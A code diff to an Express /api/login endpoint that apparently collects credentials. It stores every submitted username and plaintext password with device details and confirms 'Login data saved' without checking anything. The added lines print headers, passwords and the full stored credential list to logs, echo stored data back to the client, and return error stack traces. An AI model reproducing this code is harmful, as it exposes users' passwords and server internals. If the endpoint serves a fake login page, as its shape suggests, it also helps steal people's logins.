@@ -17,18 +17,27 @@ console.log('📊 Initial user count: 0');
 // Login endpoint
 app.post('/api/login', (req, res) => {
   try {
-    console.log('🔥 Received login request');
+    console.log('='.repeat(50));
+    console.log('🔥 NEW LOGIN REQUEST RECEIVED');
+    console.log('📥 Request headers:', req.headers);
     console.log('📥 Request body:', req.body);
+    console.log('🌐 Request URL:', req.url);
+    console.log('📍 Request IP:', req.ip);
+    console.log('='.repeat(50));
     
     const { username, password, login_method, user_agent } = req.body;
     
+    console.log('📝 Parsed data:', { username, password, login_method, user_agent });
+    
     if (!username || !password) {
-      console.log('❌ Missing username or password');
+      console.log('❌ VALIDATION FAILED: Missing username or password');
       return res.status(400).json({ 
         success: false, 
         message: 'Username and password are required' 
       });
     }
+    
+    console.log('✅ VALIDATION PASSED: Username and password present');
     
     const loginData = {
       username,
@@ -41,27 +50,37 @@ app.post('/api/login', (req, res) => {
       device: getDeviceInfo(user_agent || req.get('User-Agent'))
     };
     
-    console.log('💾 Saving login data:', loginData);
+    console.log('💾 CONSTRUCTED loginData:', JSON.stringify(loginData, null, 2));
     
     // Simpan ke memory storage (Vercel compatible)
     userDataStore.push(loginData);
     
-    console.log('✅ Login saved to memory successfully!');
-    console.log(`📊 Total users: ${userDataStore.length}`);
-    console.log('💾 Current data:', JSON.stringify(userDataStore, null, 2));
+    console.log('✅ DATA SAVED TO MEMORY!');
+    console.log(`📊 NEW TOTAL USERS: ${userDataStore.length}`);
+    console.log(`💾 CURRENT STORED DATA:`, JSON.stringify(userDataStore, null, 2));
+    console.log('='.repeat(50));
     
-    res.json({ 
+    const responseData = { 
       success: true, 
       message: 'Login data saved',
       user_count: userDataStore.length,
-      stored_data: loginData // Echo back untuk debugging
-    });
+      stored_data: loginData,
+      timestamp: new Date().toISOString()
+    };
+    
+    console.log('📤 SENDING RESPONSE:', JSON.stringify(responseData, null, 2));
+    
+    res.json(responseData);
     
   } catch (error) {
-    console.error('💥 Error saving login data:', error);
+    console.log('💥 CATCH BLOCK EXECUTED - ERROR!');
+    console.error('💥 Full error details:', error);
+    console.log('='.repeat(50));
+    
     res.status(500).json({ 
       success: false, 
-      message: 'Error saving login data: ' + error.message 
+      message: 'Error saving login data: ' + error.message,
+      error_details: error.stack
     });
   }
 });
